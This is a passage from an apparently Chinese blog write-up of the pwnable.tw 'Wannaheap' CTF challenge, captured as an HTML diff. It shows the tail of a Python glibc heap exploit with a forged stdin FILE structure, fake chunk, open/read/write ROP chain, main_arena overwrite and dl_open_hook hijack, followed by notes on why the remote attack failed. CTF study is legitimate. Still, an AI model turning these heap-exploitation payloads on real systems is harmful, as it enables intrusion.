+			 <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_file_jumps</span><span class="p">)</span>
+		<span class="c1">#3.2 fake chunk &amp; ROP</span>
+	<span class="n">fake_chunk</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">dl_open_hook</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span>\
+				<span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x621</span><span class="p">)</span>
+	<span class="n">ORW</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span>\
+			   <span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_open</span><span class="p">)</span><span class="o">+</span>\
+			   <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span>\
+			   <span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_read</span><span class="p">)</span><span class="o">+</span>\
+			   <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span>\
+			   <span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_write</span><span class="p">)</span>
+	<span class="n">fake_wide</span><span class="o">=</span><span class="p">(</span><span class="n">fake_chunk</span><span class="o">+</span><span class="n">ORW</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x140</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0x140 bytes</span>
+		<span class="c1">#3.3 hook</span>
+	<span class="n">four_hook</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#0x20 bytes</span>
+		<span class="c1">#3.4 main_arena data</span>
+	<span class="n">main_arena</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span>\
+				<span class="n">p64</span><span class="p">(</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">53</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_main_arena</span><span class="o">+</span><span class="mi">104</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+		<span class="n">main_arena</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">_main_arena</span><span class="o">+</span><span class="mi">120</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+	<span class="n">main_arena</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0xf0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+	<span class="n">payload</span><span class="o">=</span><span class="n">fake_stdin</span><span class="o">+</span><span class="n">fake_wide</span><span class="o">+</span><span class="n">four_hook</span><span class="o">+</span><span class="n">main_arena</span>
+		<span class="c1">#3.5 unsorted bin attack &amp; call dl_open_mode</span>
+	<span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="c1">#debug()</span>
+	<span class="n">itr</span><span class="p">()</span>
+
+<span class="n">exp</span><span class="p">()</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>打远程时，无法执行ROP链，怀疑是由于标准输出关闭后，没有字符来决定发送时机，导致发送数据丢，造成。说白了就是网络延时太高了，如果师傅们发现是别的问题，恳请告知。</p>
+</blockquote>
+<p>Pass：还有一种方法是修改IO_stdin的vtable为IO_str_jumps，然后利用其的underflow来获得shell，不过不知道是否可以用underflow来执行ROP链，之后可以尝试，欢迎师傅们来交流。</p>
+<h3 id="参考">参考</h3>
+<p><a href="https://www.77169.net/html/184969.html" target="_blank" rel="noopener noreffer">CTF中带来的IO_FILE新思路</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-08-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/pwnable-wannaheap/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap" data-via="xx" data-hashtags="pwn,pwnable.tw"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/pwnable-wannaheap/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/pwnable-wannaheap/" data-title="Pwnable Wannaheap"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/pwnable.tw/">pwnable.tw</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/" class="prev" rel="prev" title="文件描述符和reverse_shell"><i class="fas fa-angle-left fa-fw"></i>文件描述符和reverse_shell</a>
+            <a href="/pwnable-printable/" class="next" rel="next" title="Pwnable Printable">Pwnable Printable<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
